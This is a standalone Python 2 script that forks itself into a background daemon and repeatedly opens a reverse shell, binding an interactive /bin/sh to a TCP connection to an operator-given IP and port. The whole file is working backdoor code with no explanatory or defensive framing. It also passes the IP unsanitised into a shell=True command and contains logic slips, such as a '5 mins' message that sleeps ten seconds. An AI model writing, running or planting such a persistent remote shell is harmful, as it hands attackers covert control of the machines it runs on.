#!/usr/bin/python

import os
import sys
import socket
import time
import optparse
import subprocess

def daemon ():
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError, e:
        print >>sys.stderr, "fork #1 failed: %d (%s)" % (e.errno, e.strerror)
        sys.exit(1)

    os.chdir("/")
    os.setsid()
    os.umask(0) 

    try:
        pid = os.fork()
        if pid > 0:
            print "Daemon PID %d" % pid
            sys.exit(0)
    except OSError, e:
        print >>sys.stderr, "fork #2 failed: %d (%s)" % (e.errno, e.strerror)
        sys.exit(1) 

def shell (host, port=1711):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((host, port))
        f = s.fileno()
        os.dup2(f, 0)
        os.dup2(f, 1)
        os.dup2(f, 2)
        os.execl("/bin/sh", "sh", "-i")

    except socket.error, (errno, errstr):
        print "connect error%d\n" % os.getpid()
        time.sleep(10)

    sys.exit(127)

if __name__ == "__main__":
    daemon()

    parser = optparse.OptionParser()
    parser.add_option('-i', '--ip', dest='ip', metavar='IP', help='ip address')
    parser.add_option('-p', '--port', dest='port', metavar='PORT', help='port')

    (opt, args) = parser.parse_args()

    while(True):
        #(cin, cout) = os.popen4("netstat -nt | grep %s" % opt.ip)
        str = subprocess.call("netstat -nt | grep %s" % opt.ip, shell=True)
        try:
            os.wait()
        except OSError, e:
            pass

        if  str != '':
            print str

            try:
                pid = os.fork()
                if pid > 0:
                    print 'parent wait:%d\n' % os.getpid()
                    try:
                        os.wait()
                    except OSError, e:
                        pass
                else:
                    print 'ready to connect:%d\n' % os.getpid()
                    shell(opt.ip, opt.port)

            except OSError, e:
                sys.exit(1)
        else:
            print "start sleep 5 mins:%d\n" % os.getpid()
            time.sleep(10)
